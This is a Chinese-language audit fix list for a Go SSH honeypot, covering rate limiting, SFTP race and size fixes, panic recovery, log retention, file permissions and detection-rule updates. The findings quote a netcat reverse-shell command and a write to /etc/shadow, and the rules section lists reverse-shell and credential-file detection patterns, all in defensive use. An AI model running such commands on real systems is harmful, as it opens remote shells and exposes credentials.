# 安全审计修复清单v1.1

> 基线：`3edd814`（M2 完成，最近一次 git 提交）
> 范围：基线之后工作区全部未提交修改（14 个文件，+787 / -121）
> 验证：`go build ./...`、`go vet ./...` 均通过

本清单按「安全审计 → 修复 → 复查」三轮整理，列出所有已落地的问题修复。

---

## 一、高危修复

| 编号 | 问题 | 修复内容 | 文件 |
| --- | --- | --- | --- |
| H1 | 认证暴力破解无 IP 级限速，单源可高频建连刷资源 | 新增 `authLimiter`（IP 级滑动窗口认证限速），`PasswordCallback` 内两次校验；`seen` 超 `maxEntries` 时整体重建，防 map 内存膨胀 | `internal/ssh/server.go` |
| H2 | 单连接可开启无限 session channel，拖垮服务器 | 新增 `maxChannelsPerConn = 8` 与 `chanSem` 信号量，超限拒绝新 channel | `internal/ssh/server.go` |
| H-新1 | `pkg/sftp` 8 个 worker 并发执行同一 handle 的 WRITE（`packet-manager.go` rwChan 无顺序保证），`sftpWriter` 无锁操作 `buf`，并发 append/copy 可触发切片越界 panic，直接打穿蜜罐进程（进程级 DoS） | `sftpWriter` 增加 `sync.Mutex`，`WriteAt`/`Close`/`TransferError` 全程持锁；锁序 `w.mu -> fs.mu` 单向，无死锁 | `internal/ssh/sftp.go` |
| H-新2 | 处理链无 panic 兜底：`handleConn`/`handleSession` goroutine 中任意 panic（含攻击者可控触发的越界）会终止整个进程 | 两级 `recover` 兜底：连接级（`listenOne` 内）与 channel 级（`handleSession`），panic 仅断开该连接并记录 `remote`/`connection_id`，其余连接不受影响 | `internal/ssh/server.go` |
| H3 | SFTP 上传大小无上限，`make([]byte, 任意大小)` 触发 OOM；32 位平台 int 溢出直接 panic | 新增 `maxUploadSize = 64 MiB`，`off/len` 由客户端完全控制，负偏移、超限偏移、超限写入直接拒绝 | `internal/ssh/sftp.go` |
| H4 | VFS 写文件无大小上限，恶意超大数据写穿内存 | 新增 `maxFileSize = 64 MiB`（与 sftp 上传上限一致），`WriteFile`/`AppendFile` 落盘前校验新文件大小 | `internal/vfs/vfs.go` |

## 二、中危修复

| 编号 | 问题 | 修复内容 | 文件 |
| --- | --- | --- | --- |
| M1 | 命令替换/子 shell 深嵌套 `$($($(...)))` 耗尽栈与 CPU | 新增 `execCtx` 携带 `depth` 与 `maxCmdSubstDepth = 32`，超限返回错误 | `internal/shell/executor.go`、`internal/shell/parse.go` |
| M2 | 单命令合并输出无上限：`cat 大文件`/命令叠加把输出缓冲、channel 写入与 ttyrec 录制撑爆 | 新增 `maxOutputSize = 8 MiB` 与 `limitOutput()`，超限截断并追加 `...(output truncated)`；命令替换输出同样受限，防内存放大 | `internal/shell/executor.go` |
| M3 | `Executor` 用全局 `mu + curSessionID` 共享会话 ID，多会话并发时事件关联错乱 | 移除全局状态，改为每次 `Execute` 独立创建 `execCtx{sessionID}`，沿调用链传递，无跨会话共享 | `internal/shell/executor.go`、`internal/shell/parse.go` |
| M4 | 交互 shell 无空闲超时，连接长期占用内存/文件句柄；无回车超长粘贴无限增长 `line` | `runInteractiveShell` 增加 idle 看门狗（数据通道空闲超时自动关闭会话）；新增 `maxInteractiveLine`，超长行截断丢弃 | `internal/ssh/server.go` |
| M5 | Webhook 推送为每告警 `go d.notify()`，Webhook 慢时 goroutine 无限堆积 | 新增有界队列 `notifyQueueCap = 64` + 单 worker 串行消费（`webhookWorker`），队列满则丢弃并计数 `droppedAlerts` | `internal/detect/detector.go` |
| N1 | `nc` 目标提取缺陷：`nc -e /bin/sh 10.0.0.5 4444` 把 `/bin/sh` 误判为目标，导致横向移动检测漏报；nc/ncat 带值选项（`-e`、`--exec`）未跳过 | 新增 `ncHostPort()` 正确解析目标主机/端口：处理带值选项及其取值、合并短选项（`-lvp`）、内联值（`-p4444`、`-e/bin/sh`）、`--opt=value`；`nc()` 改用之；同时 `firstURL` 正确跳过 curl/wget 带值选项（`-O` 的 curl/wget 语义差异） | `internal/vnet/vnet.go` |
| N2 | SFTP 小写入风暴：每 `WriteAt` 全量拷贝 + 发布事件，恶意 1 字节 × 数十万次可把内存拷贝放大到几十 GB 并淹没检测/存储链路 | 新增 `sftpFlushStep = 4 MiB` 节流：`buf` 较上次落盘增量达步长才全量写回 VFS 并发布一次 `file.written`；`sftpWriter` 实现 `io.Closer` + `sftp.TransferError`，CLOSE（正常）与连接异常断开（兜底）时最终落盘并补发事件，检测不遗漏 | `internal/ssh/sftp.go` |
| N3 | 事件总线丢弃不可观测：订阅者处理不及时的事件被静默丢弃，检测/存储链路"失明"时运维无感知 | `Bus` 增加 `dropped atomic.Uint64` 计数与 `Dropped()`；`Detector` 每 30s（`busDropMonitorInterval`）检查窗口内丢弃增长，发现即发布 `event_bus_overload` 告警（medium，含 `dropped_in_window`/`dropped_total`）并记日志；订阅队列 512 → 2048 缓解 | `internal/event/bus.go`、`internal/detect/detector.go` |
| M6 | 存储长期运行磁盘耗尽：SQLite 旧行与 JSONL 流水只增不减 | 新增 `retention_days`（默认 30，0 = 不清理）；`Store` 每 6h 清理过期 SQLite 行（auth_attempts/commands/events/sessions/connections）；`jsonlWriter` 按文件名日期清理过期流水 | `internal/store/store.go`、`internal/config/config.go`、`configs/honeypot.yaml` |
| M7 | 敏感数据权限过宽：数据目录 0o755、SQLite/JSONL 文件 0644，明文口令与完整命令记录可被本机其他用户读取 | 目录收紧 0o700，SQLite 建库后 Chmod 0o600，JSONL 文件 0o600 | `internal/store/store.go` |
| N4 | VFS 写文件不做权限校验，`echo x > /etc/shadow` 等可篡改只读关键系统文件 | 新增 `permWritable()`：目标所在目录与已存在文件须带写位（owner/group/other 任一 `w`），只读则拒绝写入 | `internal/vfs/vfs.go` |
| M8 | 会话关闭后 `sessConn`（session_id → connection_id）映射只增不减，长期运行内存泄漏 | `Detector` 新增 `TypeSessionClosed` 处理，关闭即删除映射 | `internal/detect/detector.go` |
| M9 | ttyrec 录制无上限：长时间会话 + 持续输出写爆磁盘 | 新增 `maxRecordingBytes = 64 MiB`，达上限静默丢弃后续帧（录制截断，不影响会话） | `internal/tty/recorder.go` |

## 三、检测规则补强（配合上述修复）

| 规则 | 修改 | 文件 |
| --- | --- | --- |
| `recon_attempt` | `id` 按命令边界匹配（`id`/` id`/`;id` 等），避免 `pid`/`uid` 误报 | `internal/detect/rules.go` |
| `reverse_shell_attempt` | 新增 `ncLike` 统一覆盖 `nc`/`ncat`/`netcat`；新增 `-e` 变体（含内联 `-e/bin/sh`）、`/dev/tcp/`、`/dev/udp/`、`python+socket`、`perl+socket`、`powershell -nop`、`-enc ` 等模式 | `internal/detect/rules.go` |
| `credential_access`（敏感文件） | 前缀匹配覆盖通配符变体（`/etc/sha*dow`、`/etc/pass*`）；新增 `/etc/master.passwd`、`/etc/group`、`/etc/sudoers`、`/etc/hosts`、`getent passwd`/`getent shadow` | `internal/detect/rules.go` |

## 四、其他

- `.gitignore`：新增 `/dbquery-*`，忽略根目录交叉编译产物

---

## 遗留问题（未在本轮处理）

真实触发面：N5（`ls` 空参数越界 panic）、N6（管道中间缓冲无上限）
蜜罐真实度：L1（`cd ..` 不可用）、L2（`$HOME` 返回 cwd）、L3（shadow 虚构哈希）
代码质量：N7（规则 Severity 冗余）、N8（pipeCmds 递归深度）、L5（dataDir 权限与 store 不一致）、L6（authLimiter 定期重置）
设计权衡：D1（明文口令入库）、D2（AllowNoAuth）
